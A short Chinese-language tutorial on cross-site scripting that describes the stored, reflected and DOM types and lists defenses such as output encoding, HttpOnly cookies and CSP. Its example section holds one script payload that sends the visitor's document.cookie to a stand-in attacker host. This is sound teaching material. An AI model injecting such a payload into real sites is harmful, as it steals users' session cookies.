# XSS跨站脚本攻击详解

## 什么是XSS

跨站脚本攻击（Cross-Site Scripting，XSS）是一种代码注入攻击，攻击者通过在网页中注入恶意脚本代码，当用户浏览该页面时，嵌入的恶意代码会在用户的浏览器中执行。

## XSS攻击类型

### 1. 存储型XSS
恶意代码被永久存储在目标服务器上。

### 2. 反射型XSS
恶意代码作为用户请求的一部分，服务器立即返回响应。

### 3. DOM型XSS
完全在客户端执行，不涉及服务器。

## 攻击示例

```html
<script>
  document.location='http://attacker.com/steal?cookie='+document.cookie
</script>
```

## 防护策略

### 1. 输入验证
对用户输入进行严格验证。

### 2. 输出编码
对输出到HTML的内容进行编码。

### 3. HttpOnly和Secure标志
保护Cookie不被JavaScript读取。

### 4. Content Security Policy
使用CSP限制脚本来源。

## 总结
XSS是Web安全中最常见的安全问题之一，需要开发者在开发过程中时刻注意输入输出的安全性。

## 相关标签
XSS, 跨站脚本, Web安全, 前端安全
